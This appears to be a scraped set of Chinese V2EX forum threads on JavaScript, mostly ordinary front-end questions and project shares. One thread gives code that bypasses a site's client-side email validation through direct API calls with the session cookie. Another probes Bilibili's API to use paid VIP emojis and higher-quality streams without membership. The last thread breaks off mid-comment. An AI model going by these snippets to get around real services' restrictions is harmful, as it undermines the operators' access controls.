{"content": ["<div class=\"topic_content\">&lt;div class=\"main\"&gt;\r<br>\t&lt;div class=\"pan\" id=\"pan2\"&gt;&lt;img  /&gt;&lt;/div&gt;\r<br>&lt;/div&gt;\r<br>\r<br>                \r<br>                \r<br>                ////////////\r<br>                \r<br>            $('.main .pan').css(\r<br>                {\r<br>                    '-webkit-transition':'3s',\r<br>                    'transition':'3s',\r<br>                    '-webkit-transform':'rotate('+ targetDeg +'deg)',\r<br>                    'transform':'rotate('+ targetDeg +'deg)'\r<br>                }\r<br>\r<br>            );\r<br>            $('.main .pan').get(0).addEventListener('webKitTransitionEnd',function () {\r<br>                alert(2);\r<br>            })\r<br>            \r<br>            \r<br>            webKitTransitionEnd 监听不到，无法触发 alert(2);，有人知道原因吗</div>"], "reply": "7", "tittle": "webKitTransitionEnd 监听不到", "comment": ["请务必先执行绑定事件的代码，在执行事件触发的代码，谢谢", "更重要的不是先写对事件名吗？\r", "\r", "顺便我的建议是最好不要依赖 transitionEnd 这个函数。多年以前的 ios safari 有 bug 有些时候不会触发，很久没看不知道现在如何，大多数情况还不如直接用 setTImeout 。", "webKitTransitionEnd  => transitionend 或  webkitTransitionEnd", "关注，试了下不行，感觉确实有坑\r", "\r", "不必纠正书写了，真心助人者应该自己试试再回答", "webkitTransitonEnd mozTransitonEnd MSTransitonEnd otransitionend transitionend\r", "\r", "你感受一下。。。  safari 10.0 和 chrome53 表示最后一个生效", "addEventListener 的第三个参数你没写", "因为你用的浏览器已经没有 webkitTransitionEnd 的支持了，请用标准的 transitionend. 当然为了兼容你可以两个都注册上。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://i.imgur.com/0UsFTBG.png\"><img src=\"http://i.imgur.com/0UsFTBG.png\" border=\"0\" class=\"embedded_image\"></a><br>上图这两种情况的 event.gamma 获得的角度是一致的\r<br>\r<br>\r<br><a target=\"_blank\" href=\"http://i.imgur.com/8ylE1Lc.png\"><img src=\"http://i.imgur.com/8ylE1Lc.png\" border=\"0\" class=\"embedded_image\"></a><br>随着 y 轴侧翻角度的增加， event.gamma 值如黑色曲线变化，我想拟合红色曲线，所以必须区分如题的状态\r<br>请教一下怎么区分图一的两种状态？</div>"], "reply": "目前尚无回", "tittle": "DeviceOrientation 的 event.gamma 的范围是正负 90 度，那怎么区分绝对值大于 90 度的 y 轴侧翻？", "comment": []},
{"content": ["<div class=\"topic_content\">代码看了一遍，看不到怎么像可以运行的 js ，网上搜索了一遍，没有找到方法\r<br>电子书： <a target=\"_blank\" href=\"http://es6.ruanyifeng.com/\" rel=\"nofollow\">http://es6.ruanyifeng.com/</a>\r<br>github ： <a target=\"_blank\" href=\"https://github.com/ruanyf/es6tutorial/\" rel=\"nofollow\">https://github.com/ruanyf/es6tutorial/</a></div>"], "reply": "8", "tittle": "阮一峰的《ECMAScript 6 入门》网页源代码从 github 克隆下来之后怎么运行", "comment": ["这不就是一本书吗, 要运行什么 js?", "放到服务器环境内，直接访问 index.html 就可以", " 打开源码的 index.html 页面提示错误\r", "\r", " apache-tomcat 的 server.xml 加了一句<Context docBase=\"C:\\apache-tomcat-6.0.35\\webapps\" \r", "path=\"\" debug=\"0\" reloadable=\"true\"/>只可以访问 index.html ，别的也不行 ", " ", "python -m SimpleHTTPServer \r", "\r", "或者直接浏览器打开 index.html", "应该可以输出成 pdf", "php -S localhost:3000", "直接在网页里运行", " 感谢已发送\r", " 感谢已发送\r", "我 url 写错了，放 apache-tomcat 和 Python 都行，“ ", "\r", "“ ", " ”就出错了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需求：<br></p>\n<p>1.不需要用户客户端装软件<br>\n2.能控制分页打页，特别是表格，希望不截断表格行（现有的网页打页都是高度超过一页自动截断了，没办法控制）<br>\n3.可以兼容主流浏览器<br></p>\n<p>有没有比较好的方案推荐，付费的也行。谢谢。</p>\n</div></div>"], "reply": "18", "tittle": "有没有比较好的网页打印方案", "comment": ["css 里面有 针对 print 的版本", "可以手动添加分页的", "类似 excel 那种自动分页的 还没看到过...所以动态表格可能还是有点麻烦", "google cloud print 么……我校倒是有邮件自主打印和要求安装驱动的自主打印的，不知道具体实现方案……", "找了一下，发现是有提供商的大概是这家： ", " 有网页端的，至于会不会分行很难说……", "  page-break 吗？我看看去。", " 谢谢，我看看", "注意，目前表格的 page-breaks 属性依然不被 Chrome 所支持，祈祷你的客户不会使用 Chromium 内核的浏览器打印。", "如果客户有打印的需求。。其实为什么不提供下载呢？。。比如转换成 PDF 下载。。如果是纯表格，提供 XLS 下载也可以啊。。之后客户打印不是简单太多了。。", " 不是单纯的那种单行单列的表格，是我们流程系统中有很多固定样式的表单。用户需要打印出来存档。如果是单纯的表格就不会有这个需求了。", " \r", " \r", "希望是你想要的，我项目里面用过这个，打印表格不错", " 感谢，但是这个还是不太满足公司产品需求。", "很早以前用过 Lodop ，还有就是使用 Word 做模板，把内容写进模板，然后下载打印。", " 修改下应该就能满足了", "以前给一家公司做过这个报表打印，国内有专门开发这类插件的开发者 ", " \r", "尝试过 Lodop ，也需要用户客户端装插件，用户群体信息化比较薄弱，越少操作越好\r", " \r", "word 做模板这种方案我们也在讨论当中，想看看有没有更适合的方案。", " 如果涉及到后期维护， word 模板天坑， latex 模板也是天坑。我记得 lodop 在无控件的情况下会自动引导用户去下载安装吧。说实话考虑到开发难度和后期维护性， lodop 是个好选择，随便拿 api 封装一套接口半天的事情，作者貌似也更新得比较勤快。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是一名杭州的准高三学生 Weny ，今年我和网易杭研视频云运营（前 SF 运营）烧碱，一起搞起来了一个 Tanso Space KOL 分享社区（网易云是世界上最好的大腿， 5 毛一条，括号内容删除） ，邀请圈内 KOL 来做一些关键意见分享（大概都是我们圈子里年轻、并非常优秀的小伙伴，来和他们谈谈人生，分享一些优秀视野）…<br>\n暑假里大概一个月零一点，写完了这个项目，过来分享这个中小（大概业务代码在 30k Lines 左右）的前后端分离的 教育基础接入平台&amp;社区项目 下来后的一些心得。</p>\n<p><strong>概述</strong></p>\n<p>前端 React Redux</p>\n<p>后端 Laravel MySQL Redis</p>\n<p><strong>项目初衷</strong></p>\n<p>一直在观察 K12 市场，相对来说，一二线城市教育问题集中在学生、家长价值观或者说缺乏内在的动力，三四五六线城市教育问题主要集中在教育资源和贫富差距。那么今天我们做 Tanso Space 主要希望在中国一二线城市乃至三四线城市传递一种积极向上的价值观。促使更积极的阶层流动。当然做这件事从根本利益上的，从某种程度上来说与中高产根本利益相互冲突。当时我们希望在阶层固化更严重的今天，让更多人能接触到积极向上的价值观影响，从而成就一个更好的自己。 To Be Better</p>\n<p><strong>分享</strong></p>\n<p><strong>前端</strong></p>\n<img src=\"http://react-china.org/uploads/default/original/2X/f/ff58e7f9b162ed26dfd0485046d99f430fcd4d3f.jpg\">\n<p><strong>Redux &amp; Normaliser 数据流设计</strong></p>\n<p>*第一代 Module 分离 Store 设计</p>\n<p>*根据需求 分离各个 Store</p>\n<p>*第二代 Module Unity Store 设计</p>\n<p>*Router Engine 自动匹配 Master RESTful API</p>\n<p>*多个 Modules 复用 Unity Actions , Unity Store</p>\n<img src=\"http://react-china.org/uploads/default/original/2X/c/c5ce5b98443fc0517016a9ad91967e386ffc2295.jpg\">\n<p>（晚些时候有空打算开源这个项目的核心部分-RESTful API Redux React View Builder ）</p>\n<img src=\"http://react-china.org/uploads/default/original/2X/c/ce97795a495d5bed822649655e497361b86b95fa.jpg\">\n<p><strong>高复用组件设计</strong></p>\n<p>整个项目下来，封装了几个高复用组件</p>\n<ul>\n<li>\n<p>Auth 组件（ Actions 中间件 , HOC ）</p>\n</li>\n<li>\n<p>ListView 封装 ListScoll 高复用设计</p>\n</li>\n</ul>\n<p>我在 SF 写过文章有关这些组件的设计</p>\n<p><a href=\"https://segmentfault.com/a/1190000005980360\" rel=\"nofollow\">https://segmentfault.com/a/1190000005980360</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000005986111\" rel=\"nofollow\">https://segmentfault.com/a/1190000005986111</a></p>\n<img src=\"http://react-china.org/uploads/default/original/2X/5/57f01691c7f23bf796626204cf10440fa4b68f70.jpg\">\n<p><strong>性能优化</strong></p>\n<p>这是一个老生常谈的问题</p>\n<p>这个项目在未使用 Immutable 的情况下优化重复渲染</p>\n<p>主要面对问题：</p>\n<p>*数据层次过深</p>\n<p>解决方案：</p>\n<ul>\n<li>shouldComponetUpdate Func</li>\n</ul>\n<p>*指定数据深度比较</p>\n<p>*关键数据深层次比较</p>\n<p>（ 建议 Store 取数据上自己在底层封装一层，后期项目大了之后 ，再引入 Immutable 化，可以减少工程量）</p>\n<img src=\"http://react-china.org/uploads/default/original/2X/d/d9a9ffd4af7549d5d648f8bec7e4e6fee8f3059e.jpg\">\n<p><strong>后端</strong></p>\n<p>后端框架比较传统， Laravel PHP Framework ，用的是 dingo API RESTful API ，配合 JWT 。同时封装了 Repositories ，根据业务需求使用 Redis 。</p>\n<p><strong>写在最后</strong></p>\n<p>晚些时候有空打算开源这个项目的核心部分-RESTful API Redux React View Builder</p>\n<p>马上就要上线啦！一起来期待我们更多优秀小伙伴的访谈分享。</p>\n<p>（最后请不要打我，图床偷偷用的是 react-china,本来首发在 react-china ，作为一个可爱的游客最多贴两图。）</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>图挂了，补图\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide3.jpg\">\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide4.jpg\">\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide5.jpg\">\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide6.jpg\">\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide7.jpg\">\n<img alt=\"\" src=\"http://7xqbq3.com1.z0.glb.clouddn.com/Slide9.jpg\"></p>\n</div></div>"], "reply": "2", "tittle": "来分享一个教育基础接入平台&社区项目下来后的一些心得", "comment": ["图全裂了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>先上项目地址： <a href=\"https://github.com/gzzhanghao/babel-plugin-transform-beautifier\" rel=\"nofollow\">https://github.com/gzzhanghao/babel-plugin-transform-beautifier</a></p>\n<p>用<code>js-beautifier</code>反编译出来的代码长这样：</p>\n<pre><code>function _scrollToView(a) {\n  var b = this, c = b.listItems.eq(b.currentFocus), d = b.list.scrollTop(), e = c.height(), f = c.position().top, g = Math.abs(f), h = b.list.height();\n  return \"search\" === a ? e &gt; h - f ? b.list.scrollTop(d + (f - (h - e))) :-1 &gt; f &amp;&amp; b.list.scrollTop(f - e) :\"up\" === a ? -1 &gt; f &amp;&amp; b.list.scrollTop(d - g) :\"down\" === a &amp;&amp; e &gt; h - f &amp;&amp; b.list.scrollTop(d + (g - h + e)), \nb;\n}\n</code></pre>\n<p>先通过<code>babel-plugin-transform-beautifier</code>再用<code>js-beautifier</code>反编译出来的代码长这样：</p>\n<pre><code>function _scrollToView(a) {\n  var b = this;\n  var c = b.listItems.eq(b.currentFocus);\n  var d = b.list.scrollTop();\n  var e = c.height();\n  var f = c.position()\n      .top;\n  var g = Math.abs(f);\n  var h = b.list.height();\n\n  if (\"search\" === a) {\n    if (e &gt; h - f) {\n      b.list.scrollTop(d + (f - (h - e)));\n    } else if (-1 &gt; f) {\n      b.list.scrollTop(f - e);\n    }\n  } else if (\"up\" === a) {\n    if (-1 &gt; f) {\n      b.list.scrollTop(d - g);\n    }\n  } else if (\"down\" === a &amp;&amp; e &gt; h - f) {\n    b.list.scrollTop(d + (g - h + e));\n  }\n\n  return b;\n}\n</code></pre>\n<p><em>代码片段取自<a href=\"https://github.com/gfranko/jquery.selectBoxIt.js/blob/87a92f32cd118c47a8b89a90b8da209e901e52fc/src/javascripts/jquery.selectBoxIt.js#L737\" rel=\"nofollow\">这里</a></em> 。</p>\n<h2>使用方法</h2>\n<p>先用 npm 安装：</p>\n<pre><code>npm i --save-dev babel-plugin-transform-beautifier\n</code></pre>\n<p>然后给 babel 加上对应 plugin 就好：</p>\n<pre><code>{\n    plugins: ['transform-beautifier'],\n}\n</code></pre>\n<p><strong>注意：</strong> 插件只负责正常 beautifier 不做的事，也就是说要反编译一份代码我们需要先让它通过<code>babel-plugin-transform-beautifier</code>再通过<code>js-beautifier</code>。</p>\n<h2>How it works</h2>\n<p>插件的主要作用是通过各种转换把<code>js-beautifier</code>不做的事情给做了，比如把 <code>SequenceExpression</code> 拆成多个 <code>Statement</code> ，还有就是把 <code>LogicalExpression</code> 和 <code>ConditionalExpression</code> 转换成 <code>IfStatement</code> 。</p>\n<p>比如下面的代码：</p>\n<pre><code>a = b, a() &amp;&amp; b ? c() : d()\n</code></pre>\n<p>经过转换会变成：</p>\n<pre><code>a = b\nif (a() &amp;&amp; b) {\n    c()\n} else {\n    d()\n}\n</code></pre>\n<p>除此之外还有很多转换规则，这里不一一列举。</p>\n</div></div>"], "reply": "15", "tittle": "写了个反编译 JavaScript 的 babel 插件", "comment": ["这应该得叫反混淆吧...\r", "JS 编译完全没听说过", "对，反混淆。感觉还是很有意义的，特别是拆 sequential expression ，对放 debug break 很有用", "人家那是压缩，不是混淆…", "chrome 里按一下 {} ？", "反压缩", " 这样如果一堆 statement 是 a,b,c 这样下来的你就没法放 break point 在 b ，只能放在 a 然后往后走", "楼上干嘛那么纠结用词问题…在这个语境下我说反编译应该都知道这是在干嘛吧(´･_･`)", " chrome 的格式化工具不会处理`a?b:c`和`a&&b`这两种情况，实际处理效果和 js-beautify 生成的结果并没有多大区别", ".....不, 我点进来是以为楼主实现了从 js 反编译到 c++或者汇编什么的, 并不以为只是 beautify", " 那叫编译吧，这样的话反编译是指从 v8 生成的汇编变回 js ，这就有点高端了_(:з」∠)_", "不错，点赞", "有个词叫做 pretty print 找个 js 的就好了 每次碰到混淆的代码就这么处理", " 其实就是 beautifier 吧，这个工具不是用来格式化代码的，而是用来把一些压缩后的语句恢复正常的。\r", "\r", "比如下面这段代码：\r", "\r", "```javascript\r", "if (a) {\r", "    b()\r", "} else if (c) {\r", "    d()\r", "}\r", "```\r", "\r", "uglifyjs 会把它转换成`a ? b : c && d`，我所知道的所有代码格式化工具对这种表达式都只是原样输出，而我这个工具能把它变回原来的 if 语句。这点从我上面贴出来的代码就可以看出区别了。", "其实就是个格式化 js 的工具", " 还是不太一样的，格式化的工作是交给 js-beautifier 完成的，这个只负责把代码逻辑还原出来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://stateofjs.com\" rel=\"nofollow\">stateofjs.com</a></p>\n<p>你用什么前端框架？</p>\n<p>你用什么 JS 方言？</p>\n<p>你用什么编辑器？</p>\n<p>近期完成的一份 JS 开发者调查，大约 9000 个开发者回答</p>\n</div></div>"], "reply": "13", "tittle": "2016 JavaScript 调查", "comment": ["算是推广么", "不错。", " 不要一言不合就推广", "HTML", " 不是我做的呀，只是转载", "react,babel,atom", "react, es6, vim", "蛮有意思的调查，有些结果出乎意料。\r", "\r", "例如我以为 Angular 2 会吸引很多人的眼光， Sublime Text 还是最受喜欢的编辑器。", "看了，请问哪里来的编辑器？", " ", "\r", "\r", "Favorite Text Editor 那里", "ng2 我跳了又从坑里爬出来了 react 即便是用 ecma5 只要稍微用下 jsx 语法还是很优雅\r", "ng2 如果不用 ts 的话那个写法能看么", "react native 只有这么点？ 因为太新了吗？\r", "\r", "elm 算是 方言 吗？", "vue es5 webstorm"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>已经封装好了一个 API:/api/getschoolcardmonery/:id</p>\n<p>比如访问 localhost:3000/api/getschoolcardmonery/10000 会返回一个 json ：</p>\n<p>{\n\"schoolCard_Id\": 10000,\n\"leftMenory\": 8979\n}</p>\n<p>前端定义了一个&lt;input&gt;和&lt;button&gt;</p>\n<p>怎么写 ajax ，点击 button 查询 input 输入的 id 的 leftMenory 的值。</p>\n</div></div>"], "reply": "19", "tittle": "做一个余额查询的 ajax 请教", "comment": ["\r", "\r", "使用 jQuery getJSON() 方法，里面有例子", "$('#input 的 HTML 元素 id').click(function (){\r", "            随便起个名字();\r", "});\r", "function 刚才起的那个名字(){\r", "        $.ajax({\r", "            type: \"GET\",\r", "            url: \"/api/getschoolcardmonery/10000\",\r", "            success: function (data) {\r", "                alert(data['leftMenory']);\r", "            }, error: function () {\r", "                alert(\"出了点什么错误\");\r", "            }\r", "        });\r", "\r", "    }\r", "大概是这样，不知道排版会不会乱", " 擦 写错了，第一个是查询按钮的 id", " 这个 url 是需要变化的 需要根据我 input 里输入的查询 id 返回不同的值的\r", "\r", "比如我要查询的 id 是 1000 ，就请求 /api/getschoolcardmonery/10000\r", "如果想查询 11111 ，就请求 /api/getschoolcardmonery/11111", " \r", "那就文本拼接啊\r", "function 刚才起的那个名字(){ \r", "var cardID = $('#学生卡号 input 的 html 元素 ID').val().trim();\r", "$.ajax({ \r", "type: \"GET\", \r", "url: \"/api/getschoolcardmonery/\"+ cardID, \r", "success: function (data) { \r", "alert(data['leftMenory']); \r", "}, error: function () { \r", "alert(\"出了点什么错误\"); \r", "} \r", "}); \r", "\r", "}", " 好有耐心 -_-，本来想吐槽 lz 的", " \r", " 多谢多谢，新学 JavaScript ，多谢指导", " 好评？", " 好评！", " alert 出来是 undefined", " 换成 data.leftMonery", " 这个有可能是你的 Ajax 没有返回正确的 header ， 你检查一下 ajax 的请求 header 里面有没有这一句：\r", "Content-Type: application/json", " 当我上一句没说.  大部分时候 data.leftMonery 和 data['leftMenory']应该是一样的，我也不知道为啥你那里不能用 data['leftMenory']。\r", "参看：\r", "\r", "\r", "  这耐心，就是想赞一个！", "leftMoney ？你是想说 balance 吗？", "leftmoney ，这命名让人陶醉。\r", "balance 除了平衡，生活中更常用作“余额”", " 没用中文命名就不错了", " \r", " \r", " 感谢提醒", " 多谢耐心指导，确实是 Ajax 没有返回正确的 header"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原版 C++版本在此：<a href=\"https://www.v2ex.com/t/310750\" rel=\"nofollow\">用 C++撸了一个 Minecraft 字体贴图生成器</a></p>\n<p><a href=\"https://github.com/codehz/minecraft-unicode-font-texture-generator-online\" rel=\"nofollow\">源码仓库地址</a>，<a href=\"https://codehz.github.io/minecraft-unicode-font-texture-generator-online/\" rel=\"nofollow\">DEMO 地址</a></p>\n<p>运行效果\n<img alt=\"运行效果\" src=\"https://public.lightpic.info/image/22F4_57F663FE0.jpg\"></p>\n<p>基本方法不变，生成 16x16 个 16x16 贴图来表示 0x00000000 到 0xffffffff 的所有文字</p>\n<p>然后根据字体测量结果，生成对应<code>glyph_sizes.bin</code>文件</p>\n<p>这个网页版本更进一步，直接生成 zip 形式的材质包，直接扔到资源包路径，就可以直接被 Minecraft 加载了。</p>\n<p>使用的技术说明</p>\n<ul>\n<li>输出图形用的是 canvas 的原生 api</li>\n<li>创建<code>glyph_sizes.bin</code>用的是<code>Uint8Array</code></li>\n<li>让浏览器自动开始下载用的是 FileSaver.js</li>\n</ul>\n<p>由于项目实在不算大，所以没有用 npm 之类的包管理器， CSS/JS 也是直接写网页上的，当然也没有用任何框架。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "刚用 JavaScript 重新实现了一个 Minecraft 高清字体材质包生成器", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，谢谢大家了</p>\n</div></div>"], "reply": "7", "tittle": "求一个 react 移动端的库", "comment": ["ant mobile", "没懂", " 就是专门为移动端写的 react 库", " 组件库？", " 是的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近学习 js 来填写表单。遇到一个奇怪的表单，我如果是人工输入邮箱账号，或者粘贴，都是可以通过验证。如果是通过代码填写邮箱，都显示不通过。请问这个编码是如何写验证的？如果通过 js 填表，如何绕过验证？求大神，指导。</p>\n<p><img alt=\"\" src=\"http://chuantu.biz/t5/37/1475849561x1949469089.png\"></p>\n</div></div>", "<div class=\"topic_content\">这个地方在这里： <a target=\"_blank\" href=\"https://app.meiqia.com/setting/profile\" rel=\"nofollow\">https://app.meiqia.com/setting/profile</a> 需要先登入账号，然后转到上面这个链接。有个修改邮箱的地方。这个何解？</div>"], "reply": "19", "tittle": "遇到一个奇葩的 js 验证，求破解", "comment": ["可能 你看到的只是显示，还有另一个标签正真做验证", "目测数据层没有同步，手动触发一下 change 事件？", "键盘输入比对，这是我想到最简单的办法", "目测是 js 绑定事件的问题，通过代码输入的话无法触发相应的验证事件。", "if (\"createEvent\" in document) {\r", "    var evt = document.createEvent(\"HTMLEvents\");\r", "    evt.initEvent(\"change\", false, true);\r", "    element.dispatchEvent(evt);\r", "}\r", "else\r", "    element.fireEvent(\"onchange\");", " 那么如何通过代码自动设置让其看起来像触发一样。", " 手动点击不行，需要随便按下键盘字母。就可以了，复制粘贴。或者邮件粘贴也是可以的。", " 感谢，这个代码。明天电脑试一试。。有办法移除检测触发的代码不？", " 分析下他的提交代码，然后自己写个提交吧", " 「手动触发」的意思是 .val('abc').trigger('change')，不是点击", " 试过，不是。上面有网址，有时间可以测试一下。", " 看了一下页面用了 react ，更改 input 的 value 时数据没有同步到对应的组件 state 里去。由于没有 jQuery 只能这样触发 change 事件了。\r", "var event = new Event('input', { bubbles: true });\r", "document.querySelector('#newEmail').dispatchEvent(event);", "静观大牛的各种解法.", "直接新建一个提交方便吗?", "keyup keydown  input 这些事件挨个触发一遍😄", "测试可行，能够收到邮件，但是后端还是有做邮件地址的验证\r", "var getCookie = function(name) {\r", "  var value = \"; \" + document.cookie;\r", "  var parts = value.split(\"; \" + name + \"=\");\r", "  if (parts.length == 2) return parts.pop().split(\";\").shift();\r", "}\r", "fetch('https://app.meiqia.com/api/agent/agents/' + getCookie('_agent_id') + '?v=' + new Date().getTime(), {\r", "  method: 'put',\r", "  headers: {\r", "    Accept: 'application/json',\r", "    'Content-Type': 'application/json',\r", "    Authorization: getCookie('_authenticated')\r", "  },\r", "  body: JSON.stringify({\r", "    email: '", "'\r", "  })\r", "})\r", "  .then(function(response) {\r", "    return response.json()\r", "  })\r", "  .then(function(json) {\r", "    console.log(json)\r", "  })", " 牛叉。可以使用。但是这个是如何知道表单是这样子触发的呢？", " 亲测可用。感谢。这个 even 是怎么抓取到的呢？我找不到", " 点提交的时候在 network 里可以看到"]},
{"content": ["<div class=\"topic_content\">由于是一个新手，所以还没搞清楚 vue,react 之类的用法。\r<br>目前有个任务，要开发一组页面模板\r<br>因为有些部分是通用的，比如 header,footer ，但是又不想复制粘贴，所以想知道有没有方便开发的轮子\r<br>\r<br>1.可以很方便的定义路由，比如 Json 中定义\r<br>2.支持 block,局部引用，或者整体引用，比如我把 header 放到一个文件中，其他文件可以方便的引入。\r<br>3.（非必须）可以引入一个页面模板，可以很方便的利用模板来创建新的页面</div>"], "reply": "17", "tittle": "有没有什么方便开发页面的 Js 轮子", "comment": ["用 webpack 配合 js 模板引擎可以实现", "jade 现在改名 叫 pug\r", "\r", "jst 也可以，每个模块是一个单独的文件。路由那一层要自己写，解析一下 json 就行了。 也可以把 jst 转为 AMD 的方式 ", "诶?这个不是模板引擎的事情么?", " 路由的部分不是吧。。", "别理他们，用 jQuery", "第三方路由大把吧？模板也是大把吧？\r", "\r", "最简单的: page.js + lodash.js", " 好吧，没有两个都具备的轮子么，我看看去。", " 我还是知道 JQ 的。。。\r", " 谢谢！我看看", "看成“有什么开发方便面的轮子”。。。", "同楼上 233", "如果不想学如 React 、 Angular 、 Vue 之类的框架的话，就只能根据需求，挑选几个工具了。\r", "\r", "如果用 jQuery ，配合 Webpack ，用 ES6 的模版 string 写通用的 header 、 footer ，感觉也不会很麻烦。用模版引擎也能方便一点。\r", "\r", "但如果这个项目需要长期维护的，那么在选择技术方案上要慎重了：使用零散的 JS 库能应对未来开发复杂度的上升吗？\r", "\r", "特别是楼主的项目需求，上述的三个框架都能很好的完成。", "Backbone.js", " +1", "pug +1\r", "推荐 react", "框架适合实现复杂的业务逻辑，搞模板不太合适。\r", "推荐一个我做的通用模板引擎 ", " ，支持 nodejs 和浏览器环境，支持 webpack loader"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天找了半天没发现一个靠谱的，于是干脆就自己动手照着文档徒手撸了一个。</p>\n<p>Demo 页面：<a href=\"http://lovearia.me/static/html/tree.html\" rel=\"nofollow\">http://lovearia.me/static/html/tree.html\n</a></p>\n<p>初学 Vue ，轻喷。</p>\n<p><img alt=\"图片\" src=\"http://ww4.sinaimg.cn/mw690/699d3e11gw1f6xay86mt3j20f50g5gn2.jpg\"></p>\n</div></div>", "<div class=\"topic_content\">DEMO 链接： <a target=\"_blank\" href=\"http://7xr7a3.com1.z0.glb.clouddn.com//demo/tree.html\" rel=\"nofollow\">http://7xr7a3.com1.z0.glb.clouddn.com//demo/tree.html</a></div>"], "reply": "13", "tittle": "Vue 无限层级树增删改以及拖拽节点 Demo", "comment": ["居然没人理我", "额 来个 github 地址啊", " \r", "\r", "\r", "\r", "github 就不贴了，总共加起来不超过两百行代码没必要去开一个 repository 吧", " 谢谢了 这个正好给我准备做的功能来个参考", " 我也是在找参考，然后找不到一个靠谱的，于是就干脆自己自己写了……", "最近正好用到了，可是连接挂了什么鬼", " 我的服务器跪了，等晚上我给你新的链接", " \r", " \r", "\r", "DEMO 链接： ", "首先非常感谢作者 @", " 让我有了参考。\r", "在您的基础上，我自行实现了一个 TreeNode 组件，避免了使用全局变量且支持兄弟节点间的排序。\r", "在线 Demo ： ", "呃， JS Bin 的 Output 有时候会一片空白，稍微改动一下（加个空格啥的）就可以显示了。。。", " \r", "\r", "Good Job! 其实我本来也想写的，但是太懒了……", "这个怎么写啊？最近在写一个这样的效果，私活不会写", "死活不会写。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>直接贴地址:\n<a href=\"https://kyfw.12306.cn/otn/resources/js/query/train_list.js\" rel=\"nofollow\">https://kyfw.12306.cn/otn/resources/js/query/train_list.js</a>\n下载下来文本 35M,网页流量查看显示 4M...如何的慢,想想就知道了</p>\n<p>原地址:<a href=\"https://kyfw.12306.cn/otn/queryTrainInfo/init\" rel=\"nofollow\">https://kyfw.12306.cn/otn/queryTrainInfo/init</a></p>\n</div></div>"], "reply": "111", "tittle": "12306 这么大的 js 文件,怎么想的...", "comment": ["  这个不是购票页面， 基本没人用。", " 历史在开倒车啊，玩 node 的都在搞服务器渲染", "我觉得还挺好啊。。", "JS 这么大没什么问题啊...", "好屌，真的", "5s 左右 不卡", "总想搞个大新闻 ", " ", " 对对， gzip 会处理掉，脑子秀逗了", "秒开", "我操, 就算是这样用有理由, 也该把 train_no,station_train_code 简写吧, 这样可以省掉一半的容量", "测试了一下， gzip 大概能压缩到十分之一大小（ 7Z 竟然可以压缩到小于 100KB ）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>尝试了能否非会员发表情，发现他的表情在发送时是以\"[暴走漫画_把持不住]\"的形式发送的，然后我通过他的接口手动发送了\"[暴走漫画_把持不住]\",刷新一看发现他将\"[]\"强制替换成了\" [] \"，看了一会他的 Js 文件还没研究出他是用 js 替换的还是服务器后端替换的。</p>\n<p>现在有个疑问：<code>有没有办法不让他将\"[]\"替换成\" [] \"呢？</code></p>\n<ul>\n<li>另附所有表情：<a href=\"http://api.bilibili.com/x/v2/reply/emojis\" rel=\"nofollow\">链接</a></li>\n</ul>\n</div></div>", "<div class=\"topic_content\">他的表情有感兴趣的可以下载</div>"], "reply": "19", "tittle": "研究了一下哔哩哔哩的大会员表情功能", "comment": ["估计如果不是客户端处理就是服务端根据用户是否 VIP 来处理，第二种无力", "用手机看发现我说的 2 个中括号变成了一样的(不知道是不是浏览器问题)，我说的 2 个中括号分别是英文的中括号和中文的中括号\r", "\r", "\r", " \r", "他在加载页面时载入了一个叫 vip.Plugin.js 的文件。我明天起床再研究一样", "直接把评论 post 到服务器呢？", " 我一开始就说了呀，通过他的接口发送(评论)结果照样被强制替换了", " 想了一样，应该是服务端替换了", " 一样→一下", " 抱歉，没仔细看。", "比起这个更应该研究 1080P 怎么获取\r", "<accept_format>mp4,hdmp4,flv,hdflv2</accept_format>\r", "<accept_quality>4,3,2,1</accept_quality>\r", "应该就是 playurl?quality=4\r", "\r", "直接发这个请求能不能获取到 hdflv2 的视频地址？", " \r", "网上不是传言说 1080 是假的吗？\r", "我明天研究研究，现在在床上了", "远古手机端表示 post 上去的是“[]”，刷新后就变成了“ [] ”", "第二个是中文中括号 @", "表示坐等楼主成果。", "不用想了。肯定是服务端过滤。客户端过滤还一年 233 侮辱智商吗", " 也是=.=我还是来研究 1080p 吧", " 研究了一下你发的这个，下面不是有所有画质的视频链接吗(可以直接在播放器在线看的链接)？", " 哪个有所有画质？ av 号报出来\r", "正常来说默认是超清, .flv 的， quality=3 或者省略\r", "其他的需要点击对应画质切换，会发出不同 quality=的请求,mp4 或 hd.mp4\r", "现在这个多出来的 hdflv 还没看到\r", "\r", "你找一个新的有高画质的视频试试，比如 av6624125", " \r", "我研究是 av6629077\r", "\r", "抓包找到这个地址 ↓\r", " id ，不是 av***)&module=bangumi&player=1&quality=(视频质量，整数，一般为 1-4)&ts=(unix 时间戳)&sign=(认证签名)\r", "\r", "这个地址返回了你发的那个 ↓\r", "<accept_format>mp4,hdmp4,flv,hdflv2</accept_format> \r", "<accept_quality>4,3,2,1</accept_quality> \r", "\r", "然后往下一看就有视频链接\r", "\t<durl>\r", "\t\t<order>1</order>\r", "\t\t<length>361982</length>\r", "\t\t<size>78690463</size>\r", 